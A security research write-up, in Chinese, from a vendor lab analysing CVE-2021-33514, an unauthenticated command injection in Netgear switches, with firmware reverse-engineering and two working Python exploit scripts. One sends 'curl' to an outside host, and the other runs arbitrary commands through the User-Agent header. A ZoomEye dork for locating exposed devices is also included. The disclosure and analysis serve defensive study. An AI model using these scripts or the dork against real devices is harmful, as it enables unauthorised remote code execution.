> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Z_VpuANZpih704K9lUEjmQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT09IJjs3wGQbICd50va8zMqfnXZfD5LGdibcuOrtia3P4DpMAVfibZ8J4MsbHt0JW20QL8Wh0SO8zpyA/640?wx_fmt=gif)

**作者：OneShell@知道创宇 404 实验室  
时间：2021 年 7 月 21 日**

 **漏洞信息** 

CVE-2021-33514 是发生在 Netgear 多款交换机上的命令注入漏洞，可以未认证远程代码执行，CVSS3：9.8（高危）。

漏洞产生的根本原因是 libsal.so.0.0 中的函数`sal_sys_ssoReturnToken_chk`存在命令注入，这个函数用于处理 url 中的`tocken`字段，直接将`tocken`传递到格式化字符串中，然后调用`popen`执行。后端处理 setup.cgi 加载了该 so 文件，并且在处理 url 的时候调用了该存在漏洞的函数。漏洞利用起来也非常简单，直接给 cgi 发送构造了命令的请求就可以。

Netgear 官方给出的受漏洞影响设备和固件版本如下表：

<table><thead><tr><td><section>影响设备</section></td><td><section>固件版本</section></td></tr></thead><tbody><tr><td><section>GC108P</section></td><td><section>&lt;=1.0.7.3</section></td></tr><tr><td><section>GC108PP</section></td><td><section>&lt;=1.0.7.3</section></td></tr><tr><td><section>GS108Tv3</section></td><td><section>&lt;=7.0.6.3</section></td></tr><tr><td><section>GS110TPP</section></td><td><section>&lt;=7.0.6.3</section></td></tr><tr><td><section>GS110TPv3</section></td><td><section>&lt;=7.0.6.3</section></td></tr><tr><td><section>GS110TUP</section></td><td><section>&lt;=1.0.4.3</section></td></tr><tr><td><section>GS710TUP</section></td><td><section>&lt;=1.0.4.3</section></td></tr><tr><td><section>GS716TP</section></td><td><section>&lt;=1.0.2.3</section></td></tr><tr><td><section>GS716TPP</section></td><td><section>&lt;=1.0.2.3</section></td></tr><tr><td><section>GS724TPP</section></td><td><section>&lt;=2.0.4.3</section></td></tr><tr><td><section>GS724TPv2</section></td><td><section>&lt;=2.0.4.3</section></td></tr><tr><td><section>GS728TPPv2</section></td><td><section>&lt;=6.0.6.3</section></td></tr><tr><td><section>GS728TPv2</section></td><td><section>&lt;=6.0.6.3</section></td></tr><tr><td><section>GS752TPPv1</section></td><td><section>&lt;=6.0.6.3</section></td></tr><tr><td><section>GS752TPv2</section></td><td><section>&lt;=6.0.6.3</section></td></tr><tr><td><section>MS510TXM</section></td><td><section>&lt;=1.0.2.3</section></td></tr><tr><td><section>MS510TXUP</section></td><td><section>&lt;=1.0.2.3</section></td></tr></tbody></table>

 **漏洞复现** 

复现过程仅仅使用了 python 的 requests 模块，设备使用的是放置在公网的 GS110TPP，固件版本 V7.0.1.16，使用的 so 和 cgi 程序关键代码差别不大，具有代表性。通过分析交换机固件发现里面常见的可以反弹 shell 的程序都木有，那验证命令执行就使用了 curl，用它去访问我的公网 VPS，如果 nc 检测到访问，说明发生了命令注入。

```
import requests
vul_url = 'https://X.X.X.X/cgi/setup.cgi?token=\';$(cat);\''
payload = 'curl X.X.X.X.X:8080'
try:
    res = requests.post(url=vul_url, data=payload, verify=False, timeout=10)
    print('[!] should not return any thing')
except:
    print('[+] success!')
```

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVoYibhHT68mlOlbuNrBtj5s28IBQExzTbavdYhN9EzG1vEjX4JxGaDjA/640?wx_fmt=png)

 **漏洞分析** 

### 固件提取

首先在 Netgear 官网上可以下载到存在漏洞的固件，必须赞扬一下 Netgear，基本上以往的固件都可以下载到，而且几乎都是没有加密的，这对漏洞分析来说大大的好。下载到固件了按照流程`binwalk -Me`一把梭，然后使用 find 就会发现，找不到存在漏洞的 so 文件也找不到存在调用 so 的 cgi 程序。仔细看解压出来可能的文件系统文件夹里面，其实还有 modsqfs.img 和 sqfs.img 两个文件，这还得 binwalk 继续梭了这两个文件，才能有得到存在漏洞的 so 和 cgi。

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVj3kEtMhnSbW1icdp0ChnUpcqD5iclIicDWpUPs2fdGQmqN8qVoia1OldXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVYr6OIIIDnsQjCBvM7xf4vUlCNHCUHfrPiaL4HmVNSA8cFBAfHDnocaw/640?wx_fmt=png)

### 静态分析

流程上还是比较简单的。首先看一下`libsal.so`里面存在漏洞的函数`sal_sys_ssoReturnToken_chk`，下面是直接贴出来 IDA 反编译结果，可以看到直接将函数输入`a1`，格式化字符串到`v25`中，然后调用`popen`执行了`v25`。

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVnmSWj5Nwibaqo0X6qOeROs1g6iaNYLlte0B3keYuP2nruTicYZa4HYU1Q/640?wx_fmt=png)

再看看`setup.cgi`中是如何调用这个函数的，这个地方注意，C 语言的或逻辑是，如果前面的判定通过了，后续就不进行判定。第一个判定是检查`query_string`中是否含有`tocken`字符串，当我们构造了 payload 那么判定会失败，则继续执行后面使用逗号连接的 C 语句，调用漏洞函数。`strtok`函数用于使用特定字符分割字符串，详情使用可以参考函数说明，最终就把`tocken`字段的值赋值给`v9`。

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVsgLbn0IQ9xTVgLJYsNuq2mdDdpiagThA3GK5wsmq3kqVIEw3K9qjujw/640?wx_fmt=png)

### 关于 CGI 以及此处 payload 的写法

*   **CGI 如何处理用户请求**
    

之前分析的路由器后端的程序，大多是某某 httpd+cgi 的做法，当时对于 cgi 程序如何获取到 url 传递的参数就仅仅有一个感性的认识：通过环境变量来进行传参，如果是 GET 请求，那么看环境变量`QUERY_STRING`，如果是 POST 请求，可能先从`CONTENT_LENGTH`获取数据长度，然后从`STDIN`中读取指定长度的数据。但对于 cgi 程序是如何执行的，与 httpd 之间的关系是什么，还是有点迷糊。于是找了一些文章大概看了下。

CGI（Common Gateway Interface）实际上是一种约定，一种接口协议，可以使用 c、python、lua、php 来实现。WEB 服务器会根据 CGI 的类型决定如何向 CGI 程序传递数据，一般都是通过标准输入 / 输出流和环境变量来与 CGI 程序进行数据传递。例如这个地方的 WEB 服务器使用的是 lighthttpd，通过逆向可以找到有一个函数`http_cgi_headers`是用来传递给 CGI 程序的一些环境变量的。

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVuSgK3b3P0cGfqEuB9hw0KfGiaV4LsO3WD3Kzx2pOAulhNvAtXJ13wZA/640?wx_fmt=gif)

如果是使用的 POST 方式，服务器设定`CONTENT_LENGTH`环境变量说明 POST 数据的有效数据字节数，然后 CGI 通过传递的这个环境变量，从标准输入`STDIN`中去读取数据。在 POC 里面，首先 token 字段值会被注入，然后`$(cat)`从从标准输入中去读取数据，而此时 POST 的数据也被传递到了标准输入中，那么就相当于直接执行了 POST 发出的数据。

*   **payload 的另一种写法**
    

如上，是通过环境变量和标准输入传递参数给 CGI 的，最开始的 payload 是通过 POST 请求将数据通过标准输入传递给 CGI，而且没有执行结果回显。那么接下来使用 GET 请求 + 环境变量 + 获取执行结果的方式重新来写一次 payload。

首先确定将要执行的命令通过哪一个环境变量传入，这个地方选择了`User-Agent`环境变量，也是经常被使用到的一种方式。其次是决定通过何种方式进行回显，此处是将执行结果写入到`/webtmp/`文件夹的一个 js 文件中。由于`/webtmp/`文件夹和`/tmp/`是链接起来（固件文件系统中查看）的，因此写入到`/webtmp/`文件夹，然后使用 URL 访问`/tmp/`中的 js 文件即可。

```
from requests.api import head
import requests
import random
import string
requests.packages.urllib3.disable_warnings()

proxy = {
}

letters = string.ascii_letters
vul_addr = 'https://X.X.X.X'
vul_url = vul_addr + '/cgi/setup.cgi?token=\';$HTTP_USER_AGENT;\''
random_str = ''.join(random.choice(letters) for i in range(10))

cmd1 = input('InputCMD: ').replace(' ', '${IFS}')
cmd2 = f'rm /tmp/{random_str}.js'.replace(' ', '${IFS}')

payload1 = f'sh -c {cmd1}>/webtmp/{random_str}.js'
payload2 = f'sh -c {cmd2}'

header = {}

try:
    header['User-Agent'] = payload1    # 注入命令并将结果写入到js文件
    res = requests.get(vul_url, headers=header, verify=False,
                       timeout=5, allow_redirects=False, proxies=proxy)
    if res.status_code == 200:
        print('[+] command send success')
        result_file = vul_addr + f'/tmp/{random_str}.js'
        result = requests.get(result_file, timeout=5,
                              verify=False, allow_redirects=False, proxies=proxy) # 读取结果js文件
        print('[+] get result')
        print(result.text)
        print('[+] rm tmp result file')
        header['User-Agent'] = payload2
        res = requests.get(vul_url, headers=header, verify=False,
                           timeout=5, allow_redirects=False, proxies=proxy)    # 删除结果js文件
except Exception as e:
    print(e)
```

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJV0mkOmz0mxJMYDoaL7TxP8TWV0zgTc9uZYhNf84mjyjxRKkKtQ4eC9w/640?wx_fmt=png)

 **小 结** 

这次的命令注入漏洞逻辑是比较简单的，注入点不需要很长的变量依赖分析。通过对于 Netgear 几次命令注入漏洞的分析，心中大概也清楚嵌入式设备中路由器大概是怎么获取用户请求数据，然后如何传递给 CGI 程序进行处理的。

 **使用 ZoomEye 和 Pocsuite3** 

### 漏洞影响面

通过 ZoomEye 网络空间搜索引擎，搜索 ZoomEye dork 数据挖掘语法查看漏洞公网资产影响面。

zoomeye dork 关键词：**"?aj4+fileVer"**

_https://www.zoomeye.org/searchResult?q=%3Faj4%2BfileVer_

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVzRFx2ib629D5auIItbVtLpQgXp40eicMELzlPuYRPicLmDpOKZd8ibqOhQ/640?wx_fmt=png)

漏洞影响面全球视角可视化

_https://www.zoomeye.org/globalmap/%3Faj4%2BfileVer/all/0_

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVh11Y6e6Ft0cydIO7OJD3EoQE6lzJn1kWnTyZbbfokuJPb6RwLyibjXQ/640?wx_fmt=png)

### verify 模式

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVYCz5GibG3AGkGUnKaJT0z99DeGL9etOVjrLV5OPKu5VP4dKuycW0duQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVZg6S4YdWk8GVMcPlcROXODPBuSLAIcSQm5zgHWMMdAHfMDZkdMBlfw/640?wx_fmt=png)

### attack 模式

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVtsLchxiaRpHGgFjfK0FVTk1vluZwqbicWIQnwVcRAsQjnL9GykocdUVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1V8TbxA178dE9IhSA97XJVicXjTm8xavTRfsP6y4bXNAiaZuunufXneJU1oURn10tqC8q574WjVWIA/640?wx_fmt=png)

**参考链接：**
---------

https://www.cnblogs.com/liuzhang/p/3929198.html
-----------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT0Z79Hq9GCticVica4ufkjk5xiarRicG97E3oEcibNSrgdGSsdicWibkc8ycazhQiaA81j3o0cvzR5x4kRIcQ/640?wx_fmt=gif)

**往 期 热 门**

(点击图片跳转)

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/3k9IT3oQhT3KhTHWZI36e63AAqCsMmiaQsIeZ0JBZqY3vKUtJ1WXE97577Rgjl2ZNETPeuN9IBxwtL2QqOEaLVg/640?wx_fmt=jpeg)

赠书 |《404 Paper 精粹》第一期发布啦！







](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650947894&idx=1&sn=7fe7a66b5b1daffeac64b73333e9db3f&chksm=80790304b70e8a128397f499834f42012938e4f09cc537539a9bc7f2e2f5312e5e7812eb81b7&scene=21#wechat_redirect)

  

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavzvjP02IScE6fMPaPqow2JZHdciaCMzFSvkABvRwDaictDR5uYIjEtYbOFKrdfNz0cSEMOzjIE7eh2A/640?wx_fmt=jpeg)

利用 Pocsuite3 框架编写 poc 实战案例







](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650947757&idx=1&sn=677b6c36c52ce55225ae30f136b7ba5b&chksm=8079029fb70e8b89ecc9506aff4852d15d1a0237b99f691864ba7328581dae66e78f5f4d6c02&scene=21#wechat_redirect)

  

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/3k9IT3oQhT3KiaOxTyLvhQJ9X8YiaMTraiciaCYJZ5E1yRHIKagWKUeUjUq7jw06OvnBaXLA0sXWgzbxWibIfMOdlJg/640?wx_fmt=jpeg)

CVE-2021-35973：Netgear wac104 身份认证绕过







](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650947657&idx=1&sn=40ab02de0333c02711007c20bc43072e&chksm=8079027bb70e8b6d7cf3808afdd52148a7dec9f2504746bda9fb16a900bc428e10564bc10964&scene=21#wechat_redirect)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT0Z79Hq9GCticVica4ufkjk5xK8te0JrCrcOiatDWNPRndZzq1N80rlbyxU9bGuTvekqEGu5utyHqicicw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT09IJjs3wGQbICd50va8zMqN2SkNrrQyWIiaCQvodo60ZfrQIhWic0TSeglsSGiboXx1wjbOxwdu5jQw/640?wx_fmt=jpeg)

**觉得不错点个 “在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**